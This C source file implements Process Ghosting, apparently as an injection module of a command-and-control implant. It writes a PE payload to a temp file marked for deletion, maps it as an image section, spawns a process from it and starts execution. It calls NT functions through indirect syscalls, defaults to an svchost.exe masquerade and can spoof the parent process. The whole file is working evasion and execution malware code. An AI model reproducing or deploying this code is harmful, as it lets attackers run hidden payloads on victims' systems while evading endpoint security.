/*
 * process_ghost.c — Process Ghosting PE execution
 *
 * Derived from hasherezade/Process-Ghosting (MIT licence)
 * https://github.com/hasherezade/process_ghosting
 *
 * Execution path:
 *  1.  Generate temp path in %TEMP%
 *  2.  CreateFileW(DELETE_ON_CLOSE | TEMPORARY) → write PE bytes
 *  3.  SetFileInformationByHandle(FileDispositionInfo) → tombstone the file
 *      (scheduled for deletion even while the handle is open)
 *  4.  ISysNtCreateSection(SEC_IMAGE) from the tombstoned file handle
 *      → kernel creates an image section from the PE without re-reading the
 *         file path; the path no longer exists on disk.
 *  5.  CloseHandle(file) → file is deleted from directory
 *  6.  ISysNtCreateProcessEx(section) → ghost process
 *  7.  Locate PE entry point via mapped image headers
 *  8.  RtlCreateProcessParametersEx (ntdll usermode) → build PEB params
 *  9.  Allocate + write params into ghost process with ISysNtWriteVirtualMemory
 * 10.  Update PEB.ProcessParameters pointer inside ghost process
 * 11.  ISysNtCreateThreadEx(EP) → start execution
 */

#include "process_ghost.h"
#include "../syscall/indirect_syscall.h"
#include "../../src/utils.h"

#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Forward declarations from indirect_syscall.c ───────────────────────── */
extern NTSTATUS ISysNtCreateSection(
    PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
extern NTSTATUS ISysNtCreateProcessEx(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, ULONG, HANDLE, HANDLE, HANDLE, BOOLEAN);
extern NTSTATUS ISysNtCreateThreadEx(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG,
    SIZE_T, SIZE_T, SIZE_T, PVOID);
extern NTSTATUS ISysNtWriteVirtualMemory(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
extern NTSTATUS ISysNtReadVirtualMemory(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
extern NTSTATUS ISysNtAllocateVirtualMemory(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
extern NTSTATUS ISysNtQueryInformationProcess(
    HANDLE, ULONG, PVOID, ULONG, PULONG);
extern NTSTATUS ISysNtResumeThread(HANDLE, PULONG);

/* ── NT constants not always in the Windows SDK headers ─────────────────── */
#ifndef SEC_IMAGE
#  define SEC_IMAGE 0x1000000
#endif
#ifndef PROCESS_CREATE_FLAGS_INHERIT_HANDLES
#  define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x04
#endif
/* ProcessBasicInformation */
#define PROC_BASIC_INFO 0

/* ── ntdll function types (resolved at runtime) ──────────────────────────── */
typedef NTSTATUS (NTAPI *fnRtlCreateProcessParametersEx)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags);

typedef VOID (NTAPI *fnRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);

/* ── PEB offsets (x64 only) ──────────────────────────────────────────────── */
/* Offset of ProcessParameters pointer in PEB */
#define PEB_PROC_PARAMS_OFFSET 0x20

/* ── helpers ─────────────────────────────────────────────────────────────── */

static char *_err(const char *msg) {
    size_t cap = strlen(msg) + 64;
    char  *buf = (char *)malloc(cap);
    if (!buf) return NULL;
    snprintf(buf, cap, "{\"status\":\"error\",\"msg\":\"%s\"}", msg);
    return buf;
}

/* Build a unique temp path under %TEMP% */
static void _tmp_path(wchar_t *out, size_t cch) {
    wchar_t tmp[MAX_PATH] = {0};
    GetTempPathW((DWORD)cch, tmp);
    wchar_t rnd[16] = {0};
    DWORD   r       = GetTickCount() ^ (DWORD)(SIZE_T)out;
    _snwprintf_s(rnd, 16, _TRUNCATE, L"%08X.tmp", r);
    wcscpy_s(out, cch, tmp);
    wcscat_s(out, cch, rnd);
}

/* Locate the entry-point VA from a mapped image section in ghost process.
 * We read the PE headers from the ghost process virtual space.
 * ghost_base is the base address of the image inside the ghost process. */
static PVOID _ghost_ep(HANDLE ghost, PVOID ghost_base) {
    /* Read DOS header */
    IMAGE_DOS_HEADER dos = {0};
    SIZE_T           rd  = 0;
    if (!NT_SUCCESS(ISysNtReadVirtualMemory(ghost, ghost_base, &dos, sizeof(dos), &rd)))
        return NULL;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    /* Read NT headers */
    IMAGE_NT_HEADERS64 nt = {0};
    PVOID nt_addr = (BYTE *)ghost_base + dos.e_lfanew;
    if (!NT_SUCCESS(ISysNtReadVirtualMemory(ghost, nt_addr, &nt, sizeof(nt), &rd)))
        return NULL;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return NULL;

    return (BYTE *)ghost_base + nt.OptionalHeader.AddressOfEntryPoint;
}

/* ── Public API ──────────────────────────────────────────────────────────── */

char *PeGhostInject(const uint8_t *pe_data, size_t pe_size,
                    const wchar_t *cmdline, DWORD parent_pid)
{
    if (!pe_data || pe_size < sizeof(IMAGE_DOS_HEADER))
        return _err("invalid PE data");

    /* Resolve ntdll helpers at runtime */
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return _err("ntdll not loaded");

    fnRtlCreateProcessParametersEx RtlCreateProcessParametersEx =
        (fnRtlCreateProcessParametersEx)GetProcAddress(ntdll, "RtlCreateProcessParametersEx");
    fnRtlInitUnicodeString RtlInitUnicodeString =
        (fnRtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");

    if (!RtlCreateProcessParametersEx || !RtlInitUnicodeString)
        return _err("RtlCreateProcessParametersEx not found");

    /* ── 1. Create tombstoned temp file ─────────────────────────────────── */
    wchar_t tmp_path[MAX_PATH] = {0};
    _tmp_path(tmp_path, MAX_PATH);

    HANDLE hFile = CreateFileW(tmp_path,
        GENERIC_WRITE | GENERIC_READ | DELETE,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return _err("CreateFileW for ghost temp failed");

    /* Mark file for deletion while it is still open (tombstone) */
    FILE_DISPOSITION_INFO fdi = { TRUE };
    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &fdi, sizeof(fdi))) {
        CloseHandle(hFile);
        return _err("SetFileInformationByHandle delete disposition failed");
    }

    /* Write PE to tombstoned file */
    DWORD written = 0;
    if (!WriteFile(hFile, pe_data, (DWORD)pe_size, &written, NULL) || written != (DWORD)pe_size) {
        CloseHandle(hFile);
        return _err("WriteFile PE to ghost temp failed");
    }

    /* ── 2. Create image section from tombstoned file ───────────────────── */
    HANDLE hSection = NULL;
    NTSTATUS st = ISysNtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_IMAGE,
        hFile);

    CloseHandle(hFile);   /* file deleted from directory — section lives on */

    if (!NT_SUCCESS(st)) {
        char msg[64];
        snprintf(msg, sizeof(msg), "NtCreateSection failed: 0x%08lX", (ULONG)st);
        return _err(msg);
    }

    /* ── 3. Create ghost process from section ───────────────────────────── */
    HANDLE hParent = GetCurrentProcess();
    if (parent_pid != 0) {
        /* Attempt to open specified parent for handle inheritance */
        HANDLE hp = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
        if (hp) hParent = hp;
    }

    HANDLE hGhost = NULL;
    st = ISysNtCreateProcessEx(
        &hGhost,
        PROCESS_ALL_ACCESS,
        NULL,
        hParent,
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        hSection,
        NULL,
        NULL,
        FALSE);

    NtClose(hSection);
    if (parent_pid != 0 && hParent != GetCurrentProcess())
        CloseHandle(hParent);

    if (!NT_SUCCESS(st)) {
        char msg[64];
        snprintf(msg, sizeof(msg), "NtCreateProcessEx failed: 0x%08lX", (ULONG)st);
        return _err(msg);
    }

    /* ── 4. Get ghost process base address from PEB ─────────────────────── */
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG ret_len = 0;
    st = ISysNtQueryInformationProcess(hGhost, PROC_BASIC_INFO, &pbi, sizeof(pbi), &ret_len);
    if (!NT_SUCCESS(st)) {
        NtClose(hGhost);
        return _err("NtQueryInformationProcess failed on ghost");
    }

    /* Read PEB to get ImageBaseAddress */
    PVOID peb_base = pbi.PebBaseAddress;
    PVOID image_base = NULL;
    SIZE_T rd = 0;
    /* ImageBaseAddress is at PEB+0x10 (x64) */
    st = ISysNtReadVirtualMemory(hGhost, (BYTE *)peb_base + 0x10,
                                 &image_base, sizeof(image_base), &rd);
    if (!NT_SUCCESS(st) || !image_base) {
        /* Fall back to reading from PE optional header */
        IMAGE_DOS_HEADER dos = {0};
        memcpy(&dos, pe_data, sizeof(dos));
        IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(pe_data + dos.e_lfanew);
        image_base = (PVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase;
    }

    /* ── 5. Locate entry point ──────────────────────────────────────────── */
    PVOID ep = _ghost_ep(hGhost, image_base);
    if (!ep) {
        /* Parse directly from PE header */
        IMAGE_DOS_HEADER dos2 = {0};
        memcpy(&dos2, pe_data, sizeof(dos2));
        IMAGE_NT_HEADERS64 *nt2 = (IMAGE_NT_HEADERS64 *)(pe_data + dos2.e_lfanew);
        ep = (BYTE *)image_base + nt2->OptionalHeader.AddressOfEntryPoint;
    }

    /* ── 6. Build RTL_USER_PROCESS_PARAMETERS for ghost process ─────────── */
    UNICODE_STRING uImagePath = {0}, uCmdLine = {0};

    /* Use supplied cmdline or default svchost masquerade */
    const wchar_t *fake_cmdline = cmdline
        ? cmdline
        : L"C:\\Windows\\System32\\svchost.exe -k netsvcs";
    const wchar_t *fake_image = L"C:\\Windows\\System32\\svchost.exe";

    RtlInitUnicodeString(&uImagePath, fake_image);
    RtlInitUnicodeString(&uCmdLine,   fake_cmdline);

    PRTL_USER_PROCESS_PARAMETERS params = NULL;
    st = RtlCreateProcessParametersEx(
        &params, &uImagePath, NULL, NULL, &uCmdLine,
        NULL, NULL, NULL, NULL, NULL,
        RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

    if (!NT_SUCCESS(st) || !params) {
        NtClose(hGhost);
        return _err("RtlCreateProcessParametersEx failed");
    }

    /* Allocate space in ghost process and copy params */
    SIZE_T  params_size = params->EnvironmentSize + params->MaximumLength;
    PVOID   remote_params = NULL;
    st = ISysNtAllocateVirtualMemory(hGhost, &remote_params, 0,
                                     &params_size, MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (!NT_SUCCESS(st)) {
        RtlDestroyProcessParameters(params);
        NtClose(hGhost);
        return _err("NtAllocateVirtualMemory for params in ghost failed");
    }

    SIZE_T writ = 0;
    ISysNtWriteVirtualMemory(hGhost, remote_params, params,
                             params->Length, &writ);

    /* Update PEB.ProcessParameters pointer */
    PVOID peb_params_ptr_addr = (BYTE *)peb_base + PEB_PROC_PARAMS_OFFSET;
    ISysNtWriteVirtualMemory(hGhost, peb_params_ptr_addr,
                             &remote_params, sizeof(PVOID), &writ);

    RtlDestroyProcessParameters(params);

    /* ── 7. Create ghost thread at entry point ──────────────────────────── */
    HANDLE hThread = NULL;
    st = ISysNtCreateThreadEx(
        &hThread, THREAD_ALL_ACCESS, NULL,
        hGhost, ep, NULL,
        0,           /* not suspended */
        0, 0, 0, NULL);

    if (!NT_SUCCESS(st)) {
        NtClose(hGhost);
        char msg[64];
        snprintf(msg, sizeof(msg), "NtCreateThreadEx failed: 0x%08lX", (ULONG)st);
        return _err(msg);
    }

    /* Get ghost PID for the response */
    DWORD ghost_pid = GetProcessId(hGhost);
    NtClose(hThread);
    NtClose(hGhost);

    char *out = (char *)malloc(128);
    if (!out) return _err("oom");
    snprintf(out, 128,
             "{\"status\":\"ok\",\"pid\":%lu,\"msg\":\"ghost process started\"}",
             (ULONG)ghost_pid);
    return out;
}
